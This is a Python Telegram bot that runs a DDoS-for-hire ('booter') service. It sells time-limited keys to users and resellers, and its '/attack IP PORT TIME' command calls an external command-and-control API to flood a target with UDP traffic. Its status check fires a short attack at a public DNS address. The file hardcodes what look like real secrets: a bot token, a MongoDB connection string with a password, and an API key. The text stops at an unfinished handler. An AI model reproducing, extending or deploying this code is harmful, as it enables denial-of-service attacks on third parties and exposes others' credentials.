#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta
from collections import defaultdict
from pymongo import MongoClient

# ========== CONFIG ==========
BOT_TOKEN = "8291785662:AAGGtm8ipZUA3_VULK0oxen92b4KammSBJg"
ADMIN_ID = ["8487946379"]
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "WTRMWL"
MAX_CONCURRENT = 2
COOLDOWN_TIME = 60
MAINTENANCE_MODE = False

# ========== MONGODB CONNECTION ==========
MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
client = MongoClient(MONGO_URI)
db = client["xsilent_bot"]
users_collection = db["users"]
keys_collection = db["keys"]
groups_collection = db["groups"]
settings_collection = db["settings"]
blocked_users_collection = db["blocked_users"]
hosted_bots_collection = db["hosted_bots"]
blocked_bots_collection = db["blocked_bots"]

# ========== DATA STRUCTURES ==========
active_attacks = {}
cooldown = {}
group_attack_times = {}

# ========== LOAD DATA FROM MONGODB ==========
def load_users():
    users_data = users_collection.find_one({"_id": "users"})
    if not users_data:
        users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
        return {"users": [ADMIN_ID[0]], "resellers": []}
    return users_data

def load_keys():
    keys = {}
    for key_data in keys_collection.find():
        keys[key_data["key"]] = {
            "user_id": key_data.get("user_id"),
            "duration_value": key_data.get("duration_value"),
            "duration_unit": key_data.get("duration_unit"),
            "generated_by": key_data.get("generated_by"),
            "generated_at": key_data.get("generated_at"),
            "expires_at": key_data.get("expires_at"),
            "used": key_data.get("used", False),
            "used_by": key_data.get("used_by"),
            "used_at": key_data.get("used_at")
        }
    return keys

def save_users(data):
    users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)

def save_keys(keys_data):
    keys_collection.delete_many({})
    for key, info in keys_data.items():
        keys_collection.insert_one({
            "key": key,
            "user_id": info.get("user_id"),
            "duration_value": info.get("duration_value"),
            "duration_unit": info.get("duration_unit"),
            "generated_by": info.get("generated_by"),
            "generated_at": info.get("generated_at"),
            "expires_at": info.get("expires_at"),
            "used": info.get("used", False),
            "used_by": info.get("used_by"),
            "used_at": info.get("used_at")
        })

def load_groups():
    groups = {}
    for group_data in groups_collection.find():
        groups[group_data["group_id"]] = {
            "attack_time": group_data.get("attack_time", 60),
            "added_by": group_data.get("added_by"),
            "added_at": group_data.get("added_at")
        }
    return groups

def save_group(group_id, attack_time, added_by):
    groups_collection.update_one(
        {"group_id": group_id},
        {"$set": {
            "attack_time": attack_time,
            "added_by": added_by,
            "added_at": time.time()
        }},
        upsert=True
    )

def remove_group(group_id):
    groups_collection.delete_one({"group_id": group_id})

def get_group_attack_time(group_id):
    group = groups_collection.find_one({"group_id": group_id})
    if group:
        return group.get("attack_time", 60)
    return None

def load_settings():
    settings = settings_collection.find_one({"_id": "settings"})
    if not settings:
        settings = {
            "_id": "settings",
            "max_concurrent": MAX_CONCURRENT,
            "cooldown_time": COOLDOWN_TIME,
            "maintenance_mode": MAINTENANCE_MODE
        }
        settings_collection.insert_one(settings)
    return settings

def save_settings(settings):
    settings_collection.update_one({"_id": "settings"}, {"$set": settings}, upsert=True)

def load_hosted_bots():
    hosted_bots = {}
    for bot_data in hosted_bots_collection.find():
        bot_token = bot_data.get("bot_token")
        if bot_token:
            hosted_bots[bot_token] = {
                "owner_id": bot_data.get("owner_id"),
                "concurrent_limit": bot_data.get("concurrent_limit", 2),
                "bot_name": bot_data.get("bot_name", "Unknown"),
                "added_by": bot_data.get("added_by"),
                "added_at": bot_data.get("added_at", time.time()),
                "status": bot_data.get("status", "active")
            }
    return hosted_bots

def save_hosted_bot(bot_token, owner_id, concurrent_limit, bot_name, added_by):
    hosted_bots_collection.update_one(
        {"bot_token": bot_token},
        {"$set": {
            "bot_token": bot_token,
            "owner_id": owner_id,
            "concurrent_limit": concurrent_limit,
            "bot_name": bot_name,
            "added_by": added_by,
            "added_at": time.time(),
            "status": "active"
        }},
        upsert=True
    )

def remove_hosted_bot(bot_token):
    hosted_bots_collection.delete_one({"bot_token": bot_token})

def block_hosted_bot(bot_token, reason="No reason provided"):
    blocked_bots_collection.update_one(
        {"bot_token": bot_token},
        {"$set": {
            "bot_token": bot_token,
            "blocked_at": time.time(),
            "reason": reason,
            "blocked_by": "admin"
        }},
        upsert=True
    )
    hosted_bots_collection.update_one(
        {"bot_token": bot_token},
        {"$set": {"status": "blocked"}}
    )

def unblock_hosted_bot(bot_token):
    blocked_bots_collection.delete_one({"bot_token": bot_token})
    hosted_bots_collection.update_one(
        {"bot_token": bot_token},
        {"$set": {"status": "active"}}
    )

def is_bot_blocked(bot_token):
    return blocked_bots_collection.find_one({"bot_token": bot_token}) is not None

def is_user_blocked(user_id):
    return blocked_users_collection.find_one({"user_id": user_id}) is not None

def block_user(user_id, reason="No reason provided", blocked_by="admin"):
    blocked_users_collection.update_one(
        {"user_id": user_id},
        {"$set": {
            "user_id": user_id,
            "blocked_at": time.time(),
            "reason": reason,
            "blocked_by": blocked_by
        }},
        upsert=True
    )

def unblock_user(user_id):
    blocked_users_collection.delete_one({"user_id": user_id})

# Load all data
users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
groups = load_groups()
settings = load_settings()
hosted_bots = load_hosted_bots()

MAX_CONCURRENT = settings.get("max_concurrent", 2)
COOLDOWN_TIME = settings.get("cooldown_time", 60)
MAINTENANCE_MODE = settings.get("maintenance_mode", False)

bot = telebot.TeleBot(BOT_TOKEN)

# ========== HELPER FUNCTIONS ==========
def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if duration_str.isdigit():
        return int(duration_str), "day"
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    return None, None

def get_expiry_date(value, unit):
    if unit == "hour":
        return datetime.now() + timedelta(hours=value)
    else:
        return datetime.now() + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return str(value) + " Hour(s)"
    else:
        return str(value) + " Day(s)"

def check_total_active_attacks():
    now = time.time()
    count = 0
    for attack_id, info in list(active_attacks.items()):
        if now < info["finish_time"]:
            count += 1
        else:
            del active_attacks[attack_id]
    return count

def check_active_attack_by_target(ip, port):
    target_key = ip + ":" + str(port)
    now = time.time()
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def format_attack_status():
    now = time.time()
    slots = []
    for attack_id, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            slots.append({
                "target": info["target_key"],
                "user": info["user"],
                "remaining": remaining
            })
    
    status_msg = f"📊 SLOT STATUS ({len(slots)}/{MAX_CONCURRENT})\n\n"
    for i, slot in enumerate(slots, 1):
        status_msg += f"❌ SLOT {i}: BUSY\n"
        status_msg += f"   🎯 {slot['target']}\n"
        status_msg += f"   👤 {slot['user']}\n"
        status_msg += f"   ⏰ {slot['remaining']}s left\n\n"
    
    for i in range(len(slots), MAX_CONCURRENT):
        status_msg += f"✅ SLOT {i+1}: FREE\n\n"
    
    return status_msg

def check_user_expiry(user_id):
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True:
            if now < info["expires_at"]:
                return True
    return False

# ========== MAIN BOT COMMANDS ==========

@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    
    if MAINTENANCE_MODE and uid not in ADMIN_ID:
        bot.reply_to(msg, "🔧 Bot is under maintenance! Please try again later.")
        return
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
        return
    
    chat_type = msg.chat.type
    if chat_type in ["group", "supergroup"]:
        group_id = str(msg.chat.id)
        attack_time = get_group_attack_time(group_id)
        if attack_time:
            bot.reply_to(msg, f"🔥 XSILENT DDOS BOT - GROUP\n\n✅ Group Approved!\n⚡ Attack Time: {attack_time}s\n\n📝 COMMANDS:\n/attack IP PORT\n/help")
        else:
            bot.reply_to(msg, "❌ Group not approved! Contact owner.")
        return
    
    if uid in ADMIN_ID:
        bot.reply_to(msg, f"""👑 XSILENT OWNER HELP 👑

📝 COMMANDS:

/attack IP PORT TIME - Launch attack
/status - Check slots
/cooldown - Check your cooldown
/setmax 1-100 - Set concurrent limit
/setcooldown 1-300 - Set cooldown time

/genkey 1 or 5h - Generate key
/removekey KEY - Remove key

/add USER - Add user
/remove USER - Remove user
/addreseller USER - Add reseller
/removereseller USER - Remove reseller

/addgroup GROUP_ID TIME - Add group
/removegroup GROUP_ID - Remove group
/block USER_ID REASON - Block user
/unblock USER_ID - Unblock user
/blockedlist - List blocked users

/host BOT_TOKEN USER_ID CONCURRENT OWNER_NAME - Host bot
/unhost BOT_TOKEN - Remove hosted bot
/blockhostbot BOT_TOKEN REASON - Block hosted bot
/unblockhostbot BOT_TOKEN - Unblock hosted bot

/maintenance on/off - Maintenance mode
/broadcast - Broadcast (text/photo/video)
/stopattack IP:PORT - Stop attack
/allusers - List users
/allgroups - List groups
/allhosts - List hosted bots
/api_status - API status

⚡ Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
🛒 Buy: XSILENT""")
    elif uid in resellers:
        bot.reply_to(msg, f"""🔥 XSILENT DDOS BOT - RESELLER

✅ Reseller Access
⚡ Total Concurrent: {MAX_CONCURRENT}

📝 COMMANDS:
/attack IP PORT TIME
/status
/genkey 1
/genkey 5h
/mykeys
/addgroup GROUP_ID TIME - Add group
/removegroup GROUP_ID - Remove group
/block USER_ID REASON - Block user
/unblock USER_ID - Unblock user
/blockedlist - List blocked users""")
    elif uid in users:
        has_active = check_user_expiry(uid)
        bot.reply_to(msg, f"""🔥 XSILENT DDOS BOT - USER

✅ Status: {'Active' if has_active else 'Expired'}
⚡ Total Concurrent: {MAX_CONCURRENT}

📝 COMMANDS:
/attack IP PORT TIME
/status
/cooldown
/redeem KEY""")
    else:
        bot.reply_to(msg, "❌ Unauthorized! Use /redeem KEY")

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    
    if MAINTENANCE_MODE and uid not in ADMIN_ID:
        bot.reply_to(msg, "🔧 Bot is under maintenance!")
        return
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
        return
    
    args = msg.text.split()
    if len(args) != 4:
        bot.reply_to(msg, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 80 60")
        return
    
    ip, port, duration = args[1], args[2], args[3]
    
    try:
        port = int(port)
        duration = int(duration)
        if duration < 10 or duration > 300:
            bot.reply_to(msg, "❌ Duration must be 10-300 seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port or duration!")
        return
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    if uid not in ADMIN_ID and not check_user_expiry(uid):
        bot.reply_to(msg, "❌ Access expired! Use /redeem KEY")
        return
    
    total_active = check_total_active_attacks()
    if total_active >= MAX_CONCURRENT:
        bot.reply_to(msg, f"❌ All {MAX_CONCURRENT} slots are full!\nUse /status")
        return
    
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
            return
    
    existing = check_active_attack_by_target(ip, port)
    if existing:
        bot.reply_to(msg, f"❌ Target already under attack!\nFinishes in {int(existing['finish_time'] - time.time())}s")
        return
    
    cooldown[uid] = time.time()
    attack_id = f"{uid}_{int(time.time())}"
    finish_time = time.time() + duration
    
    active_attacks[attack_id] = {
        "user": uid,
        "finish_time": finish_time,
        "ip": ip,
        "port": port,
        "target_key": f"{ip}:{port}"
    }
    
    bot.reply_to(msg, f"🔥 ATTACK LAUNCHED!\n🎯 {ip}:{port}\n⏱️ {duration}s\n📊 {total_active + 1}/{MAX_CONCURRENT} slots")
    
    def run():
        try:
            api_params = {
                "api_key": API_KEY,
                "target": ip,
                "port": port,
                "time": duration,
                "method": "UDP"
            }
            requests.get(API_URL, params=api_params, timeout=10)
            time.sleep(duration)
            bot.send_message(msg.chat.id, f"✅ Attack finished!\n🎯 {ip}:{port}")
        except:
            bot.send_message(msg.chat.id, "❌ Attack failed!")
        finally:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status(msg):
    uid = str(msg.chat.id)
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!")
        return
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    status_msg = format_attack_status()
    bot.reply_to(msg, status_msg)

@bot.message_handler(commands=['cooldown'])
def cooldown_cmd(msg):
    uid = str(msg.chat.id)
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!")
        return
    
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Cooldown: {int(remaining)} seconds remaining")
        else:
            bot.reply_to(msg, "✅ No cooldown! You can attack now.")
    else:
        bot.reply_to(msg, "✅ No cooldown! You can attack now.")

@bot.message_handler(commands=['setmax'])
def set_max_concurrent(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /setmax 1-100")
        return
    
    try:
        new_max = int(args[1])
        if new_max < 1 or new_max > 100:
            bot.reply_to(msg, "❌ Value must be 1-100!")
            return
        
        global MAX_CONCURRENT
        MAX_CONCURRENT = new_max
        settings["max_concurrent"] = new_max
        save_settings(settings)
        bot.reply_to(msg, f"✅ Concurrent limit set to {new_max}")
    except:
        bot.reply_to(msg, "❌ Invalid number!")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /setcooldown 1-300")
        return
    
    try:
        new_cooldown = int(args[1])
        if new_cooldown < 1 or new_cooldown > 300:
            bot.reply_to(msg, "❌ Value must be 1-300!")
            return
        
        global COOLDOWN_TIME
        COOLDOWN_TIME = new_cooldown
        settings["cooldown_time"] = new_cooldown
        save_settings(settings)
        bot.reply_to(msg, f"✅ Cooldown set to {new_cooldown} seconds")
    except:
        bot.reply_to(msg, "❌ Invalid number!")

@bot.message_handler(commands=['maintenance'])
def maintenance(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /maintenance on/off")
        return
    
    global MAINTENANCE_MODE
    if args[1].lower() == "on":
        MAINTENANCE_MODE = True
        settings["maintenance_mode"] = True
        save_settings(settings)
        bot.reply_to(msg, "🔧 Maintenance mode ENABLED. Only owner can use bot.")
    elif args[1].lower() == "off":
        MAINTENANCE_MODE = False
        settings["maintenance_mode"] = False
        save_settings(settings)
        bot.reply_to(msg, "✅ Maintenance mode DISABLED. Bot is back online.")
    else:
        bot.reply_to(msg, "❌ Use on/off")

@bot.message_handler(commands=['genkey'])
def genkey(msg):
    uid = str(msg.chat.id)
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!")
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /genkey 1 (1 day) or /genkey 5h (5 hours)")
        return
    
    value, unit = parse_duration(args[1])
    if value is None:
        bot.reply_to(msg, "❌ Invalid! Use: 1 (day) or 5h (hours)")
        return
    
    key = generate_key()
    expires_at = get_expiry_date(value, unit)
    
    keys_data[key] = {
        "duration_value": value,
        "duration_unit": unit,
        "generated_by": uid,
        "generated_at": time.time(),
        "expires_at": expires_at.timestamp(),
        "used": False
    }
    save_keys(keys_data)
    
    bot.reply_to(msg, f"✅ KEY GENERATED!\n🔑 `{key}`\n⏰ {format_duration(value, unit)}\n📅 Expires: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}")

@bot.message_handler(commands=['removekey'])
def removekey(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /removekey KEY")
        return
    
    key = args[1]
    if key in keys_data:
        del keys_data[key]
        save_keys(keys_data)
        bot.reply_to(msg, f"✅ Key {key} removed!")
    else:
        bot.reply_to(msg, "❌ Key not found!")

@bot.message_handler(commands=['add'])
def add_user(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /add USER_ID")
        return
    
    new_user = args[1]
    if new_user in users:
        bot.reply_to(msg, "❌ User already exists!")
        return
    
    if is_user_blocked(new_user):
        bot.reply_to(msg, "❌ User is blocked! Unblock first.")
        return
    
    users.append(new_user)
    users_data["users"] = users
    save_users(users_data)
    bot.reply_to(msg, f"✅ User {new_user} added!")

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /remove USER_ID")
        return
    
    target = args[1]
    if target in users:
        users.remove(target)
        users_data["users"] = users
        save_users(users_data)
        bot.reply_to(msg, f"✅ User {target} removed!")
    else:
        bot.reply_to(msg, "❌ User not found!")

@bot.message_handler(commands=['addreseller'])
def add_reseller(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /addreseller USER_ID")
        return
    
    new_reseller = args[1]
    if new_reseller in resellers:
        bot.reply_to(msg, "❌ Already a reseller!")
        return
    
    if is_user_blocked(new_reseller):
        bot.reply_to(msg, "❌ User is blocked! Unblock first.")
        return
    
    resellers.append(new_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    
    if new_reseller not in users:
        users.append(new_reseller)
        users_data["users"] = users
        save_users(users_data)
    
    bot.reply_to(msg, f"✅ Reseller {new_reseller} added!")

@bot.message_handler(commands=['removereseller'])
def remove_reseller(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /removereseller USER_ID")
        return
    
    target = args[1]
    if target in resellers:
        resellers.remove(target)
        users_data["resellers"] = resellers
        save_users(users_data)
        bot.reply_to(msg, f"✅ Reseller {target} removed!")
    else:
        bot.reply_to(msg, "❌ Reseller not found!")

@bot.message_handler(commands=['addgroup'])
def add_group(msg):
    uid = str(msg.chat.id)
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!")
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    args = msg.text.split()
    if len(args) != 3:
        bot.reply_to(msg, "Usage: /addgroup GROUP_ID TIME\nExample: /addgroup -100123456789 60")
        return
    
    group_id = args[1]
    try:
        attack_time = int(args[2])
        if attack_time < 30 or attack_time > 300:
            bot.reply_to(msg, "❌ Time must be 30-300 seconds!")
            return
        
        save_group(group_id, attack_time, uid)
        bot.reply_to(msg, f"✅ Group {group_id} added with {attack_time}s attack time!")
    except:
        bot.reply_to(msg, "❌ Invalid time!")

@bot.message_handler(commands=['removegroup'])
def remove_group_cmd(msg):
    uid = str(msg.chat.id)
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!")
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /removegroup GROUP_ID")
        return
    
    group_id = args[1]
    remove_group(group_id)
    bot.reply_to(msg, f"✅ Group {group_id} removed!")

# ========== USER BLOCK COMMANDS ==========
@bot.message_handler(commands=['block'])
def block_user_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    args = msg.text.split(maxsplit=2)
    if len(args) < 2:
        bot.reply_to(msg, "Usage: /block USER_ID [REASON]\nExample: /block 123456789 Spamming")
        return
    
    user_to_block = args[1]
    reason = args[2] if len(args) > 2 else "No reason provided"
    
    if user_to_block in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot block owner!")
        return
    
    if is_user_blocked(user_to_block):
        bot.reply_to(msg, f"⚠️ User {user_to_block} is already blocked!")
        return
    
    block_user(user_to_block, reason, uid)
    
    # Remove from users/resellers if present
    if user_to_block in users:
        users.remove(user_to_block)
        users_data["users"] = users
        save_users(users_data)
    
    if user_to_block in resellers:
        resellers.remove(user_to_block)
        users_data["resellers"] = resellers
        save_users(users_data)
    
    bot.reply_to(msg, f"✅ USER BLOCKED!\n👤 User: {user_to_block}\n📝 Reason: {reason}")
    
    try:
        bot.send_message(user_to_block, f"🚫 You have been blocked!\nReason: {reason}")
    except:
        pass

@bot.message_handler(commands=['unblock'])
def unblock_user_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /unblock USER_ID")
        return
    
    user_to_unblock = args[1]
    
    if not is_user_blocked(user_to_unblock):
        bot.reply_to(msg, f"⚠️ User {user_to_unblock} is not blocked!")
        return
    
    unblock_user(user_to_unblock)
    bot.reply_to(msg, f"✅ USER UNBLOCKED!\n👤 User: {user_to_unblock}")
    
    try:
        bot.send_message(user_to_unblock, "✅ You have been unblocked!")
    except:
        pass

@bot.message_handler(commands=['blockedlist'])
def blocked_list(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    blocked = list(blocked_users_collection.find())
    if not blocked:
        bot.reply_to(msg, "📋 No blocked users found.")
        return
    
    blocked_msg = "🚫 BLOCKED USERS LIST\n\n"
    for i, user in enumerate(blocked, 1):
        blocked_msg += f"{i}. 👤 User: {user.get('user_id')}\n"
        blocked_msg += f"   📝 Reason: {user.get('reason', 'No reason')}\n"
        blocked_msg += f"   👮 Blocked by: {user.get('blocked_by', 'Unknown')}\n"
        blocked_msg += f"   📅 Date: {datetime.fromtimestamp(user.get('blocked_at', time.time())).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    
    bot.reply_to(msg, blocked_msg)

# ========== HOST BOT COMMANDS ==========
@bot.message_handler(commands=['host'])
def host_bot(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 5:
        bot.reply_to(msg, """⚠️ Usage: /host BOT_TOKEN USER_ID CONCURRENT OWNER_NAME
📌 Concurrent: 1-100
📌 Example: /host 123456:ABC 8487946379 10 MONSTER""")
        return
    
    bot_token = args[1]
    owner_id = args[2]
    try:
        concurrent_limit = int(args[3])
        if concurrent_limit < 1 or concurrent_limit > 100:
            bot.reply_to(msg, "❌ Concurrent must be 1-100!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid concurrent value!")
        return
    
    bot_name = args[4]
    
    # Check if bot is already hosted
    if bot_token in hosted_bots:
        bot.reply_to(msg, "⚠️ Bot already hosted!")
        return
    
    # Check if bot is blocked
    if is_bot_blocked(bot_token):
        bot.reply_to(msg, "❌ This bot is blocked from hosting!")
        return
    
    # Test if bot token works
    try:
        test_bot = telebot.TeleBot(bot_token)
        test_bot.get_me()
        save_hosted_bot(bot_token, owner_id, concurrent_limit, bot_name, uid)
        hosted_bots[bot_token] = {
            "owner_id": owner_id,
            "concurrent_limit": concurrent_limit,
            "bot_name": bot_name,
            "added_by": uid,
            "added_at": time.time(),
            "status": "active"
        }
        bot.reply_to(msg, f"""✅ BOT HOSTED SUCCESSFULLY!

📌 Bot Token: {bot_token[:20]}...
👤 Owner ID: {owner_id}
⚡ Concurrent Limit: {concurrent_limit}
🏷️ Bot Name: {bot_name}

The bot is now ready to use!""")
    except:
        bot.reply_to(msg, "❌ Invalid bot token! Bot not found.")

@bot.message_handler(commands=['unhost'])
def unhost_bot(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /unhost BOT_TOKEN")
        return
    
    bot_token = args[1]
    if bot_token in hosted_bots:
        remove_hosted_bot(bot_token)
        del hosted_bots[bot_token]
        bot.reply_to(msg, f"✅ Bot {bot_token[:20]}... removed from hosting!")
    else:
        bot.reply_to(msg, "❌ Bot not found!")

@bot.message_handler(commands=['blockhostbot'])
def block_hostbot(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split(maxsplit=2)
    if len(args) < 2:
        bot.reply_to(msg, "Usage: /blockhostbot BOT_TOKEN [REASON]\nExample: /blockhostbot 123456:ABC Spamming")
        return
    
    bot_token = args[1]
    reason = args[2] if len(args) > 2 else "No reason provided"
    
    if is_bot_blocked(bot_token):
        bot.reply_to(msg, f"⚠️ Bot is already blocked!")
        return
    
    block_hosted_bot(bot_token, reason)
    bot.reply_to(msg, f"""✅ HOSTED BOT BLOCKED!

🤖 Bot Token: {bot_token[:20]}...
📝 Reason: {reason}

The bot will now show "BLOCKED BOT" to all users.""")

@bot.message_handler(commands=['unblockhostbot'])
def unblock_hostbot(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /unblockhostbot BOT_TOKEN")
        return
    
    bot_token = args[1]
    
    if not is_bot_blocked(bot_token):
        bot.reply_to(msg, f"⚠️ Bot is not blocked!")
        return
    
    unblock_hosted_bot(bot_token)
    bot.reply_to(msg, f"✅ Hosted bot {bot_token[:20]}... unblocked!")

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    user_list = []
    for u in users:
        if u in ADMIN_ID:
            role = "👑 OWNER"
        elif u in resellers:
            role = "💎 RESELLER"
        else:
            role = "👤 USER"
        user_list.append(f"{role}: {u}")
    
    response = "📋 ALL USERS:\n" + "\n".join(user_list) + f"\n\nTotal: {len(users)}"
    bot.reply_to(msg, response)

@bot.message_handler(commands=['allgroups'])
def all_groups_cmd(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    if not groups:
        bot.reply_to(msg, "📋 No groups found.")
        return
    
    group_list = []
    for gid, info in groups.items():
        group_list.append(f"📌 Group: {gid}\n   Time: {info['attack_time']}s\n   By: {info['added_by']}\n")
    
    response = "📋 ALL GROUPS:\n\n" + "\n".join(group_list) + f"\nTotal: {len(groups)}"
    bot.reply_to(msg, response)

@bot.message_handler(commands=['allhosts'])
def all_hosts(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    if not hosted_bots:
        bot.reply_to(msg, "📋 No hosted bots found.")
        return
    
    host_list = []
    for token, info in hosted_bots.items():
        status_emoji = "✅" if info['status'] == 'active' else "❌"
        host_list.append(f"{status_emoji} Bot: {info['bot_name']}\n   Token: {token[:20]}...\n   Owner: {info['owner_id']}\n   Concurrent: {info['concurrent_limit']}\n   Status: {info['status']}\n")
    
    response = "📋 ALL HOSTED BOTS:\n\n" + "\n".join(host_list) + f"\nTotal: {len(hosted_bots)}"
    bot.reply_to(msg, response)

@bot.message_handler(commands=['stopattack'])
def stop_attack(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /stopattack IP:PORT")
        return
    
    target = args[1]
    stopped = 0
    for aid, info in list(active_attacks.items()):
        if info["target_key"] == target:
            del active_attacks[aid]
            stopped += 1
    
    if stopped > 0:
        bot.reply_to(msg, f"✅ Stopped {stopped} attack(s) on {target}")
    else:
        bot.reply_to(msg, f"❌ No active attack on {target}")

@bot.message_handler(commands=['api_status'])
def api_status_cmd(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    try:
        response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=1", timeout=5)
        status = "✅ Online" if response.status_code == 200 else "❌ Offline"
        bot.reply_to(msg, f"{status}\nActive Attacks: {len(active_attacks)}\nMax Concurrent: {MAX_CONCURRENT}")
    except:
        bot.reply_to(msg, "❌ API is offline!")

@bot.message_handler(commands=['redeem'])
